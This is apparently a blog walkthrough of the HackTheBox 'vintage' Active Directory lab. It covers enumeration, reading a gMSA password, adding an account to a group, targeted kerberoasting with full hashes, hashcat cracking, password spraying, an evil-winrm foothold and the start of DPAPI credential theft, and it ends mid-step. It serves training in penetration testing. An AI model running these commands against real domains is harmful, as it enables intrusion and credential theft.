---
title: "HackTheBox - vintage"
author: Nasrallah
description: ""
date: 2025-07-23 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, hard, ad]
img_path: /assets/img/hackthebox/machines/vintage
image:
    path: vintage.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[vintage](https://app.hackthebox.com/machines/vintage) start by exploiting a computer to read gmsa password of a machine account that can add itself to a group who has generic write over 3 service accounts. We perform a targeted kerberos and crack the hash of one of the accounts. After getting the password we perform a password spray and find a user that has winrm access giving us foothold to the machine. Once in we find dpapi credentials files along with it's key so we copy them to our machine and extract credentials of an admin user. The latter is a member of a group with that has the `AllowedToAct` attribute, we perform a RBCD attack and get domain admin.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.45          
Host is up (0.14s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION      
53/tcp   open  domain        Simple DNS Plus   
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 22:41:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows                       

Host script results:
| smb2-security-mode:
|   3:1:1:          
|_    Message signing enabled and required
| smb2-time:        
|   date: 2025-07-15T22:41:17
|_  start_date: N/A
```

The target appears to be a domain controller with the domain `vintage.htb` and DC `dc01.vintage.htb`

Let's add those two domain to our `/ets/hosts` file before we continue.

The following credentials were provided `p.rosa:Rosaisbest123`

### SMB

First, let's try authenticating to SMB

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-15 23:41]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb 10.10.11.45 -u p.rosa -p Rosaisbest123
SMB         10.10.11.45     445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.45     445    dc01             [-] vintage.htb\p.rosa:Rosaisbest123 STATUS_NOT_SUPPORTED 
```

It didn't work, netexec tells us that `NTLM` authentication is disabled. Let's try with kerberos.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-15 23:43]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb 10.10.11.45 -u p.rosa -p Rosaisbest123 -k
SMB         10.10.11.45     445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.45     445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123 
```

It worked!

Let's list shares now.

```terminal

┌──[10.10.16.18]-[sirius💀parrot]-[25-07-15 23:43]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb 10.10.11.45 -u p.rosa -p Rosaisbest123 -k --shares
SMB         10.10.11.45     445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.45     445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123 
SMB         10.10.11.45     445    dc01             [*] Enumerated shares
SMB         10.10.11.45     445    dc01             Share           Permissions     Remark
SMB         10.10.11.45     445    dc01             -----           -----------     ------
SMB         10.10.11.45     445    dc01             ADMIN$                          Remote Admin
SMB         10.10.11.45     445    dc01             C$                              Default share
SMB         10.10.11.45     445    dc01             IPC$            READ            Remote IPC
SMB         10.10.11.45     445    dc01             NETLOGON        READ            Logon server share 
SMB         10.10.11.45     445    dc01             SYSVOL          READ            Logon server share 
```

No interesting share, just the defaults. Let's get a list of users.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-15 23:43]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb 10.10.11.45 -u p.rosa -p Rosaisbest123 -k --users 
SMB         10.10.11.45     445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.45     445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123 
SMB         10.10.11.45     445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.45     445    dc01             Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain 
SMB         10.10.11.45     445    dc01             Guest                         2024-11-13 14:16:53 0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.45     445    dc01             krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account 
SMB         10.10.11.45     445    dc01             M.Rossi                       2024-06-05 13:31:08 0        
SMB         10.10.11.45     445    dc01             R.Verdi                       2024-06-05 13:31:08 0        
SMB         10.10.11.45     445    dc01             L.Bianchi                     2024-06-05 13:31:08 0        
SMB         10.10.11.45     445    dc01             G.Viola                       2024-06-05 13:31:08 0        
SMB         10.10.11.45     445    dc01             C.Neri                        2024-06-05 21:08:13 0        
SMB         10.10.11.45     445    dc01             P.Rosa                        2024-11-06 12:27:16 0        
SMB         10.10.11.45     445    dc01             svc_sql                       2025-07-15 22:32:04 0        
SMB         10.10.11.45     445    dc01             svc_ldap                      2024-06-06 13:45:27 0        
SMB         10.10.11.45     445    dc01             svc_ark                       2024-06-06 13:45:27 0        
SMB         10.10.11.45     445    dc01             C.Neri_adm                    2024-06-07 10:54:14 0        
SMB         10.10.11.45     445    dc01             L.Bianchi_adm                 2024-11-26 11:40:30 0 
```

After a clean up we end up with the following list.

```text
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

### BloodHound

Let's run bloodhound collection.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-15 23:51]-[~/ctf/htb/vintage]
└──╼[★]$ nxc ldap 10.10.11.45 -u p.rosa -p Rosaisbest123 -k --bloodhound --collection all --dns-server 10.10.11.45 -d vintage.htb --kdcHost dc01.vintage.htb
LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.10.11.45     389    DC01             [+] vintage.htb\p.rosa:Rosaisbest123
LDAP        10.10.11.45     389    DC01             Resolved collection methods: trusts, objectprops, container, dcom, rdp, localadmin, session, psremote, group, acl
LDAP        10.10.11.45     389    DC01             Using kerberos auth without ccache, getting TGT
LDAP        10.10.11.45     389    DC01             Done in 0M 26S
LDAP        10.10.11.45     389    DC01             Compressing output into /home/sirius/.nxc/logs/DC01_10.10.11.45_2025-07-15_235130_bloodhound.zip
```

Let's upload the file to bloodhound and see what we can find.

![fs01](1.png)

We see that the `fs01` computer is part of the `PRE-WINDOWS 2000 COMPATIBLE ACCESS` group.

>When a new computer account is configured as "pre-Windows 2000 computer", its password is set based on its name.
{: .prompt-info }

So the password of this computer is `fs01`, let's test it.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 0:38]-[~/ctf/htb/vintage]              
└──╼[★]$ nxc smb dc01.vintage.htb -u fs01 -p fs01 -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01:fs01
```

It worked. Let's check on bloodhound if this computer has any other privileges.

![gmsa](2.png)

The `fs01` is part of the `domain computers` group which has `readgmsapassword` over computer account `gmsa01$`.

Let's read the password using the following command.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 0:39]-[~/ctf/htb/vintage]
└──╼[★]$ nxc ldap dc01.vintage.htb -u fs01 -p fs01 -k --gmsa
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\fs01:fs01
LDAP        dc01.vintage.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.vintage.htb 389    DC01             Account: gMSA01$              NTLM: 5008d30496b4c5069ce1fc187b5b5960     PrincipalsAllowedToReadPassword: Domain Computers
```

Now that we got the hash of `gmsa01$`, we saw that this account can add itself to `ServiceManager` group which has generic write over three users `svc_sql`, `svc_lsqp` and `svc_ark`.

Let's add the `gmsa01$` account to the group, but first we need to get a tgt.

```terminal

┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 17:59]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb dc01.vintage.htb -u 'gmsa01$' -H 5008d30496b4c5069ce1fc187b5b5960 -k --generate-tgt gmsa
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\gmsa01$:5008d30496b4c5069ce1fc187b5b5960 
SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: gmsa2.ccache
SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=gmsa.ccache
```

Now we export the tgt with `export KRB5CCNAME=gmsa.ccache` and run the following command to add the account to the group.

```bash
bloodyAD -k --host DC01.vintage.htb -d vintage.htb add groupMember servicemanagers 'gmsa01$'
```

Now let's get another ticket.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 17:59]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb dc01.vintage.htb -u 'gmsa01$' -H 5008d30496b4c5069ce1fc187b5b5960 -k --generate-tgt gmsa2
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\gmsa01$:5008d30496b4c5069ce1fc187b5b5960
SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: gmsa2.ccache
SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=gmsa2.ccache         
```

With the new ticket, let's do a targeted kerberoast attack on the three accounts we found earlier.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 18:00]-[~/ctf/htb/vintage]
└──╼[★]$ KRB5CCNAME=gmsa2.ccache targetedKerberoast.py -v -d vintage.htb -k --dc-ip 10.10.11.45 --dc-host DC01.vintage.htb --no-pass 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (svc_ldap)
[+] Printing hash for (svc_ldap)
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$0df0c43d656456488b756c8bd975e76b$e1f9e4524e1575a735aa599c65d9100c06ab45db7fc5b89e07357a4ca63102fbb782c48d6a8f6cd8a93b791f28678019384bb2e7ddf77f70e06d9fb814610e5588ba8b6a115961fd4812ca37718c7f08cc3d0b3e5c86fcd10ed8ac2ea77d6dc33bf1ddf3ea0c20ec7024a7b1c26d1bf3ebaf7b6e4b7766db0ec723eded002d36f7bb2d09d31c162203399ad8015c40b258513bc45637a649cf84e7ec0d3d28b2bca9251ad7faa8cadf59fd845204ec5245f6a96821ce8ba6895b4920464701cc0db0a84d63fb4dcd1200a3dc6dd93f8a0f61b0c0d28055a1adc44aef52ec88b0ea5a5445d4c4a33133256b2e5deb6256a984cf846d5fed00041546ea476c86a4d056aace19c5226d1c781760e9ad2ac2aaf63a414f392763a13b1819f75743e9b94f8bdfb0339667b7d707af7bf3602d154db31a482eee3ef5e4ccc49c25c6d329f80df64bca7ed75f28cb4184cb9dcb6209b23a3d3ad314ff38aff562214aeb4e4505b9fdef9c1ba3dd49008a1adbdff52216fe3f9ad6b591c3dc376ac9f5b79a82baaca39123e5ba6ac23496e89d4cc89b62318e06805dc38a9cf045721e839f9bba1e48638cbe34830f55a68283cb0de64b20191afc3a2f755d4e3014e902d8a884ba1d57838c3567dd1c6fdbc68c015220c3a9c73ea3c8a7a5c8aa7c7e3c768048592308b2013e747c5bd470adf12fad0f79789735d6fa7e8529c80053c2956d7ee5cc6e43b15b51be9c5925674d1644d9bcf72b4628a7ffd0b96e052abaf9ede6db0507d7ec77e3d1c0c0cbc685c6e045f5a64a44731b4f8ba5050d58bc12df65f0224be270b108911e4ade8252a3d4b180250964f4cdc678f90f4055b2f4161af9556ce0c667e22bff1ef3ea7f5d81c9fb66cff20ec2a96e3f393fa0127c6ff5f861b883907fb36c1b31ecae91ba67831efdbe14e9463abd7fedeb4945bf761e9c66a5582091d94149faaccbdc92932c4a43034783f0237634902daa68cc6aea247c5e621ae584c9297816d96da65ef7222c041580558b382e0488b1c987fe358a6cf0e6a88ce900ec7759211777d4e4c0d2a2e27c09ab96d59ce097dac0652470dbb01bd0ee6f518b67d0d91eddc7423c10359f290ceea9817463a66c8063f6801708b1f3ba7ba561ede8c76f9a880bddbcdd50e75cef7efe94e69898cdccaf423dda32a2eed957be4f59d0b46427ab733f95a3f927c0e611585bef3ae3849cb729e893eb831ee0767fbf350212d0506eecc58177d6085abc1b5705cb742b23a79259aa8b3d5261f69fc0a2650eb911739548c7c198aae53c8e0467dc06b103c5b802edd1f4c87f7d1cdd69cf88b1ecdc918ec2221804a7c260346d935810e699deeed4ecefe4b38d701f6b6bf0f9ce3e8a5bf69bc5a787e2d1c5966912c60174f31d3c4d4cf10090e119533cb0da7e153606d610d22cd5895e122caab67105
[VERBOSE] SPN removed successfully for (svc_ldap)
[VERBOSE] SPN added successfully for (svc_ark)
[+] Printing hash for (svc_ark)
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$e2af13a80befc4ec36a20b4a9635c0cc$52d8cc55b196ef5d5a7abf825cae7c7d24afbff12fd697336d11ee9a2b3eb328bed176e08af0036453c83d51524a9225e7218b961ab26edffe51a0d10005bfb73e0a8b164ba5d54a38322c4f680151e23ed3def2392b50a7b80bee70553a8ab6ee5d50b9f7d2f8fb6b3893a054808471104dc9dfaf49d7453e31226f9857d498a0627d40c1ddf7610d93fdeaf52c667f3f059cea003ec522a33dc89323d59e0e7118d36f404d260cbe0a0a0685efd10ef83b62c964645654f3bc5bf1cf6aa528797440e369b0bebaa5ea79525658cbf3aed3dca88aad93626073a68fc0939e15c50bd0355cc914cd4f0231ebf148620709e5e8d1fac272d69fc54a7f2809afc1848470c95e744a9bf000ab31e3a5d5647d1185571adfce7be68c57aca492ff7396871eb5deec5a372421c922961c506943db58a27575a427863986cf046a779d6e9de5283f248ccda11a8f07cee1ab2191b218549ccf423794c2c42e5a2aa054e82747134b646be291a09086413c93e8495e8aedc228de0b984d7e14dae90e25187b2eba7cdab99ba138bf7b85ac223548a4839f23c1cd0e86a94d0d343fc8ef48bfb52937bae8302787f78b969e29f19e9a4a2148b37b05bf27791bbf9795f74e54996791364c1a0bc513c9f2d2df837f5df0f5a6ab2c81702c7799fcec8e7ab15de0e774ffd7ba989baee3faf89014f07b0c5942263cb8978c1b6c71b9d836fff4ec6e8433644b3751a7ce86ec4357d671160ffa255742c0c6d63825beb019ed04bfae7dd562ed51564234d1613cd5d7abff78dcd930054779aa4c9a175869825b0a86918e4de19b1702f9a8725333fa2eff5514ac93372ab88f3a861f7b8df1e11004620373f0fd0f7cee7b7eea2cbf496b3e045dfd568f80dbd9c4faf5ae6c153d11089eb0e4b1a3f821f4ccedae2702861009e88268e950fce685c31a0666385f1c93caa6fe5230ae2fd00e020a66b226f520493e25a7b2136205256954ef25eb164104af60662522455f6a6352198f486802410433f2ceba5acc5c13b40fe40d0fd991910f108e13eb06bf8d0a110728546348ffc9324db29e42b8b98534ea0d8420b22b1158efb37743460cefa1c37ce8bcb2098e9d24a48011fdea687d554b1e426452ce70783461a72be4d9b26c33c97779b1690b0219f793c201233b78d17feaced33c5379831519408b197b6ae290dae1660bb31c4608554797562db4d97ef55f6acdf730d52988d4555743c27ff1cdc856bcd29b02416e6c15dcfbd544daee189f8fda1ea8b62606140e83eff1a61c11b342ed802b85481b1b6ead015acdbaa8118efa0d54a964941443b6e8c4cdc15f592a4ac29875a251aaa419fb7476a69a8c42072baa563c9be962cd2aa2fc5680f9c3d3b0833975ec7d8d152da47b6d894ce43ba69dcf9c731dd329cd3c5c6b6cd25ad7a600f04b16a4b464034e
[VERBOSE] SPN removed successfully for (svc_ark)
```

We only got 2 hashes, we are missing the `svc_sql` hash.

![sql](3.png)

From bloodhound we can see that this user is actually disabled. Let's enable it using the following command.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 18:07]-[~/ctf/htb/vintage]
└──╼[★]$ KRB5CCNAME=gmsa01$.ccache bloodyAD -k --host DC01.vintage.htb -d vintage.htb remove uac svc_sql -f ACCOUNTDISABLE
 [-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl 
```

Now let's do another targeted keberoast on user `svc_sql`.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 18:08]-[~/ctf/htb/vintage]
└──╼[★]$ KRB5CCNAME=gmsa01$.ccache targetedKerberoast.py -v -d vintage.htb -k --dc-ip 10.10.11.45 --dc-host DC01.vintage.htb --request-user svc_sql
[*] Starting kerberoast attacks
[*] Attacking user (svc_sql)
[VERBOSE] SPN added successfully for (svc_sql)
[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$b718f8184906a29987ad3cddc4af67f4$00806404535e6e2719be8a2caa715d56896e4a0783a61108cfaaf6d1367dc96c5802c7d983db6f3760be06dab25be2387b5b93efe06331e41dfde5dfce9d1a11948e58784f82cd97bafd38709bdb570981444b2b19e515b925b2e5dc224eb1a1f5adbb4e1957fe3a20d8b6b2a13e2ba960fc0216a0312338f67283c5157f043444a346867ace9feb363e787c22df1b23eaa5c3ade78d1a2178b8a8cf4da7e44e7e67034614a90217254bd7f7aeabd7d4d4a133422b3db042f52b6d4c254f715eaf261c425207a01cee39fcf182600152dd42806c8f7a58e9e1080c9b7845d2a53620811826bd8363adc279c24e9cdec95293332d07010fd24e0c605d8ab1dfc52c725aeedc02e1e812a8fb086a699810552681e70891c5b29b104c636a3bac62d3d0409d1077c63e02150d8e83e17a530a858d5c5776319f5a73a932c50a0abbef569bf46808169e1bd3d2f2df9e53a87a273ce345179a725b1c2caa26e7c10bd03e31374d6fc360b45eda34aa0425b339d21b160b3e9d097b15a20cb7b4a7f44ca3b677d1463759341cd90aaeb9796d1c2722653733d7c6b73c65d40f0a77ca11a5b9b7150e476abb06324aa78d4bc0a8c2a4c372ea93356766a055f8dafa2b7693aa107638eea39a4090d05f1855527d2bb51d7ef4c3a1f10e1e22389025b488f8406f1ea13b6493bdc7611337161c1326d6bdeb1561fb437cba27eab2340a9b5544d7f67cb1eb8179ff6f3dc2ee0a6f32f57b576bb057bf34224df31896b8d8e1ec4cfb8be7610d57160c4ddde2d9fdd8826f7d1842ea92d1cb5a1e50743859ddbd26137971fc471adf6d75f8393a857bc9f46df99c930702993c6347fe72d0d381d2acfa758ba5dee7ecba34bbb0e4562917f218ab6d2012f245967e41b7f143ac876c191327d6f98dc1a68f130b42fe09f3b7aa064e689820dda1dcc5dd5288be66295855f9a17c52cace3c1ba4d82a4d4bf8c15a5d519427edc6d5f04b77174cfce19a1e262e9171053f5a4e94c9ebe0c29dc5647416eed893c4953aeda4fb9dbf4c3d21c1493e41ff98eeab157d86870b6c7eaeccc058022ad1911804086a1516e738301d78e9822dc5509f0438fcf32718ce5596059fe15497a5cc097dddb84eb272cc625aed49f83873a1a38aa1749234cef45942c5f717922be0d2d68ad95abcc33dcd7e2a07c1236627eff78c224aba92f983d892bc6630b42f74558e76debc55c9402d62bd14f1884c42025b1304b98c113c41f0664b13fdcc26c6f9a68eba247b06277e49eede887f9c56a3eebac52358c3cb514b7de56f46c99f4ff150bda53850ebae166502335856813794e5b06f09622586265837fe6c1e5a530809686042502bc55a5621f75d07e81911bb817151282fea4c93e675bdfda17ef81b26546d29dde78bae7ecae01b82d340b7eb9631b273d77cb9954885c5601325
[VERBOSE] SPN removed successfully for (svc_sql)
```

We got the hash, let's put them all in a file and crack them using hashcat mode 13100.

```terminal
λ .\hashcat.exe hashes.txt rockyou.txt -m 13100
hashcat (v6.2.6) starting

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$b718f8184906a29987ad3cddc4af67f4$00806404535e6e2719be8a2caa715d56896e4a0783a61108cfaaf6d1367dc96c5802c7d983db6f3760be06dab25be2387b5b93efe06331e41dfde5dfce9d1a11948e58784f82cd97bafd38709bdb570981444b2b19e515b925b2e5dc224eb1a1f5adbb4e1957fe3a20d8b6b2a13e2ba960fc0216a0312338f67283c5157f043444a346867ace9feb363e787c22df1b23eaa5c3ade78d1a2178b8a8cf4da7e44e7e67034614a90217254bd7f7aeabd7d4d4a133422b3db042f52b6d4c254f715eaf261c425207a01cee39fcf182600152dd42806c8f7a58e9e1080c9b7845d2a53620811826bd8363adc279c24e9cdec95293332d07010fd24e0c605d8ab1dfc52c725aeedc02e1e812a8fb086a699810552681e70891c5b29b104c636a3bac62d3d0409d1077c63e02150d8e83e17a530a858d5c5776319f5a73a932c50a0abbef569bf46808169e1bd3d2f2df9e53a87a273ce345179a725b1c2caa26e7c10bd03e31374d6fc360b45eda34aa0425b339d21b160b3e9d097b15a20cb7b4a7f44ca3b677d1463759341cd90aaeb9796d1c2722653733d7c6b73c65d40f0a77ca11a5b9b7150e476abb06324aa78d4bc0a8c2a4c372ea93356766a055f8dafa2b7693aa107638eea39a4090d05f1855527d2bb51d7ef4c3a1f10e1e22389025b488f8406f1ea13b6493bdc7611337161c1326d6bdeb1561fb437cba27eab2340a9b5544d7f67cb1eb8179ff6f3dc2ee0a6f32f57b576bb057bf34224df31896b8d8e1ec4cfb8be7610d57160c4ddde2d9fdd8826f7d1842ea92d1cb5a1e50743859ddbd26137971fc471adf6d75f8393a857bc9f46df99c930702993c6347fe72d0d381d2acfa758ba5dee7ecba34bbb0e4562917f218ab6d2012f245967e41b7f143ac876c191327d6f98dc1a68f130b42fe09f3b7aa064e689820dda1dcc5dd5288be66295855f9a17c52cace3c1ba4d82a4d4bf8c15a5d519427edc6d5f04b77174cfce19a1e262e9171053f5a4e94c9ebe0c29dc5647416eed893c4953aeda4fb9dbf4c3d21c1493e41ff98eeab157d86870b6c7eaeccc058022ad1911804086a1516e738301d78e9822dc5509f0438fcf32718ce5596059fe15497a5cc097dddb84eb272cc625aed49f83873a1a38aa1749234cef45942c5f717922be0d2d68ad95abcc33dcd7e2a07c1236627eff78c224aba92f983d892bc6630b42f74558e76debc55c9402d62bd14f1884c42025b1304b98c113c41f0664b13fdcc26c6f9a68eba247b06277e49eede887f9c56a3eebac52358c3cb514b7de56f46c99f4ff150bda53850ebae166502335856813794e5b06f09622586265837fe6c1e5a530809686042502bc55a5621f75d07e81911bb817151282fea4c93e675bdfda17ef81b26546d29dde78bae7ecae01b82d340b7eb9631b273d77cb9954885c5601325:Zer0the0ne

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sq...601325
Time.Started.....: Fri Jul 18 17:25:13 2025 (2 secs)
Time.Estimated...: Fri Jul 18 17:25:15 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   486.6 kH/s (7.49ms) @ Accel:16 Loops:1 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1044480/14344384 (7.28%)
Rejected.........: 0/1044480 (0.00%)
Restore.Point....: 1032192/14344384 (7.20%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: alexlaura -> PORTOPORTO
```

The only password cracked was `svc_sql` which is `Zer0the0ne`.

Let's test it.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 18:10]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb dc01.vintage.htb -u svc_sql -p Zer0the0ne -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_sql:Zer0the0ne
```

it works, looking at the `sql_svc` on bloodhound we don't see anything useful, let's run a password spray using the list of users we made earlier.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 18:11]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k 
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne
```

We got a hit with user `c.neri`

## **Foothold**

On bloodhound we see that this user is part of `remote management users`.

![remote](4.png)

This allows us to winrm to the box.

First, let's generate a tgt.

```terminal
──╼[★]$ nxc smb dc01.vintage.htb -u c.neri -p Zer0the0ne -k --generate-tgt c.neri
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: c.neri.ccache
SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=c.neri.ccache
```

Now for evil-winrm we need to generate a krb5.conf file.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 19:20]-[~/ctf/htb/vintage]
└──╼[★]$ nxc smb dc01.vintage.htb -u c.neri -p Zer0the0ne -k --generate-krb5-file krb5.conf
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri:Zer0the0ne 

┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 19:22]-[~/ctf/htb/vintage]
└──╼[★]$ cat krb5.conf      

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
```

We copy the file to `/etc/` and now we can connect via evil-winrm.

```terminal
──[10.10.16.18]-[sirius💀parrot]-[25-07-16 18:19]-[~/ctf/htb/vintage]
└──╼[★]$ KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents>
```

## **Privilege Escalation**

### c.neri -> c.neri_adm

Looking through the files belonging to c.neri we come across dpapi credentials.

```terminal
*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft\credentials> ls -force
                                                      
    Directory:C:\Users\CNeri\appdata\roaming\microsoft\credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6 
```

We can also find the master key.

```terminal
*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115> ls -force

    Directory: C:\Users\C.Neri\appdata\roaming\microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred
```

#### DPAPI

I tried downloading the file using evil-winrm and smb but both failed, let's use base64 instead, the files aren't that big anyway.

```powershell
